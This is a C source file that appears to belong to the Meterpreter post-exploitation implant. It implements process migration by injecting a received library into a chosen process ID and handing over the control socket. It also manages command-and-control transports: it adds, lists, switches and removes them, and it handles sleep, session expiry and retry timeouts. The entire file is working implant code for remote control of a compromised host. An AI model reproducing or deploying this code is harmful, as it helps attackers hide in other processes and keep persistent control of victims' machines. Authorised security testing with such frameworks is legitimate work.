#include "common.h"
#include "base_inject.h"
#include "passfd_server.h"

LONG passfd_thread(THREAD *thread) {
	SOCKET *orig_fd = (SOCKET *)(thread->parameter1);
	LPSTR sock_path = (LPSTR)(thread->parameter2);

	if (orig_fd == NULL || sock_path == NULL)
		return ERROR_INVALID_PARAMETER;

	return passfd(*orig_fd, sock_path);
}

DWORD
remote_request_core_migrate(Remote *remote, Packet *packet)
{
	char *sock_path;
	Packet * response = NULL;
	pid_t pid = 0;
	library l;
	DWORD result = 0;
	SOCKET orig_fd = 0;

	dprintf("[MIGRATE] Getting packet data");

	response = packet_create_response(packet);

	// Get the process identifier to inject into
	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
	// Get the target process architecture to inject into
	l.arch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);
	// Get the length of the library buffer
	l.length = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);
	// Receive the actual migration library buffer
	l.data = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
	// Get the library entry point
	l.entry_point = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ENTRY_POINT);
	// Get the library base address
	l.base_addr = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_BASE_ADDR);
	// Get the path for the local socket
	sock_path = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_SOCKET_PATH);

	dprintf("[MIGRATE] Migrating to %d, Arch: %d, Library Length: 0x%x, Library Base Address: 0x%x, Library Entry Point: 0x%x, Socket path : %s", 
			pid, 
			l.arch, 
			l.length,
			l.base_addr,	
			l.entry_point, 
			sock_path);

	if (remote->transport->get_socket) {
		orig_fd = remote->transport->get_socket(remote->transport);
	}
	
	dprintf("[MIGRATE] Creating passfd thread to share socket %d", orig_fd);

	THREAD *socket_thread = thread_create((THREADFUNK)passfd_thread, &orig_fd, sock_path, NULL);

	if (!socket_thread) {
		dprintf("[MIGRATE] Failed to create the passfd thread");
		packet_transmit_response(ERROR_INVALID_HANDLE, remote, response);
		return ERROR_INVALID_HANDLE;
	}

	if (!thread_run(socket_thread)) {
		thread_destroy(socket_thread);
		dprintf("[MIGRATE] Failed to run the passfd thread");
		packet_transmit_response(EINVAL, remote, response);
		return EINVAL;
	}

	dprintf("[MIGRATE] Injecting library");
	result = inject_library(pid, &l);
	if (result != 0) {
		thread_join(socket_thread);
		thread_destroy(socket_thread);
		packet_transmit_response(result, remote, response);
		return result;
	}

	thread_join(socket_thread);
	thread_destroy(socket_thread);

	dprintf("[MIGRATE] return success");
	packet_transmit_response(ERROR_SUCCESS, remote, response);	
	return FALSE;
}

DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** transportBufer)
{
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Transport* transport = NULL;
	char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANS_URL);

	TimeoutSettings timeouts = { 0 };

	int sessionExpiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

	// special case, will still leave this in here even if it's not transport related
	if (sessionExpiry != 0) {
		remote->sess_expiry_time = sessionExpiry;
		remote->sess_expiry_end = current_unix_timestamp() + remote->sess_expiry_time;
	}

	if (timeouts.comms == 0) {
		timeouts.comms = remote->transport->timeouts.comms;
	}
	if (timeouts.retry_total == 0) {
		timeouts.retry_total = remote->transport->timeouts.retry_total;
	}
	if (timeouts.retry_wait == 0) {
		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
	}

	dprintf("[CHANGE TRANS] Url: %s", transportUrl);
	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);

	do {
		if (transportUrl == NULL) {
			dprintf("[CHANGE TRANS] Something was NULL");
			break;
		}

		if (strncmp(transportUrl, "tcp", 3) == 0) {
			MetsrvTransportTcp config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
			transport = remote->trans_create(remote, &config.common, NULL);
		}

		// tell the server dispatch to exit, it should pick up the new transport
		result = ERROR_SUCCESS;
	} while (0);

	*transportBufer = transport;

	return result;
}

DWORD remote_request_core_transport_list(Remote* remote, Packet* packet) {
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do {
		response = packet_create_response(packet);

		if (!response) {
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Add the session timeout to the top level
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());

		Transport* current = remote->transport;
		Transport* first = remote->transport;

		do {
			Packet* transportGroup = packet_create_group();

			if (!transportGroup) {
				// bomb out, returning what we have so far.
				break;
			}

			dprintf("[DISPATCH] Adding URL %S", current->url);
			packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_URL, current->url);
			dprintf("[DISPATCH] Adding Comms timeout %u", current->timeouts.comms);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_COMM_TIMEOUT, current->timeouts.comms);
			dprintf("[DISPATCH] Adding Retry total %u", current->timeouts.retry_total);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_TOTAL, current->timeouts.retry_total);
			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);

			if (current->type != METERPRETER_TRANSPORT_SSL) {
				HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
				dprintf("[DISPATCH] Transport is HTTP/S");
				if (ctx->ua) {
					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
				}
				if (ctx->proxy) {
					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
				}
				if (ctx->proxy_user) {
					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
				}
				if (ctx->proxy_pass) {
					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
				}
				if (ctx->cert_hash) {
					packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
				}
			}

			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);

			current = current->next_transport;
		} while (first != current);
	} while (0);

	if (response) {
		packet_transmit_response(result, remote, response);
	}

	return result;
}

BOOL remote_request_core_transport_next(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)", remote->transport, remote->transport->next_transport);
	if (remote->transport == remote->transport->next_transport) {
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_PARAMETER;
	}
	else {
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->next_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;

}

BOOL remote_request_core_transport_prev(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)", remote->transport, remote->transport->prev_transport);
	if (remote->transport == remote->transport->prev_transport) {
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_PARAMETER;
	}
	else {
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->prev_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;
}

DWORD remote_request_core_transport_remove(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;

	// make sure we are not trying to remove the last transport
	if (remote->transport == remote->transport->prev_transport) {
		dprintf("[DISPATCH] Refusing to delete the last transport");
		result = ERROR_INVALID_FUNCTION;
	}
	else {
		Transport* found = NULL;
		Transport* transport = remote->transport;
		char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANS_URL);

		do {
			if (strcmp(transportUrl, transport->url) == 0) {
				found = transport;
				break;
			}

			transport = transport->next_transport;
		} while (transport != remote->transport);

		if (found == NULL || found == remote->transport) {
			dprintf("[DISPATCH] Transport not found, or attempting to remove current");
			// if we don't have a valid transport, or they're trying to remove the
			// existing one, then bomb out (that might come later)
			result = ERROR_INVALID_PARAMETER;
		}
		else {
			remote->trans_remove(remote, found);
			dprintf("[DISPATCH] Transport removed");
		}
	}

	packet_transmit_empty_response(remote, packet, result);
	dprintf("[DISPATCH] Response sent.");
	return result;
}

DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
{
	Transport* transport = NULL;
	DWORD result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, result);
	return result;
}

BOOL remote_request_core_transport_sleep(Remote* remote, Packet* packet, DWORD* result)
{
	// we'll reuse the comm timeout TLV for this purpose
	DWORD seconds = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);

	dprintf("[DISPATCH] request received to sleep for %u seconds", seconds);

	// to sleep, we simply jump to the same transport, with a delay
	remote->next_transport_wait = seconds;
	remote->next_transport = remote->transport;

	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);
	*result = ERROR_SUCCESS;

	// exit out of the dispatch loop
	return FALSE;
}

BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* result)
{
	Transport* transport = NULL;
	*result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, *result);

	if (*result == ERROR_SUCCESS) {
		remote->next_transport = transport;
		// exit out of the dispatch loop.
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
 *         this message is the new/current settings.
 */
DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do {
		response = packet_create_response(packet);
		if (!response) {
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		// if it's in the past, that's fine, but 0 implies not set
		if (expirationTimeout != 0) {
			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
			remote->sess_expiry_time = expirationTimeout;
			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
		}

		if (commsTimeout != 0) {
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0) {
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0) {
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response) {
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
 *         this message is the new/current settings.
 */
DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do {
		response = packet_create_response(packet);
		if (!response) {
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		// TODO: put this in a helper function that can be used everywhere?

		// if it's in the past, that's fine, but 0 implies not set
		if (expirationTimeout != 0) {
			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
			remote->sess_expiry_time = expirationTimeout;
			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
		}

		if (commsTimeout != 0) {
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0) {
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0) {
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response) {
		packet_transmit_response(result, remote, response);
	}

	return result;
}

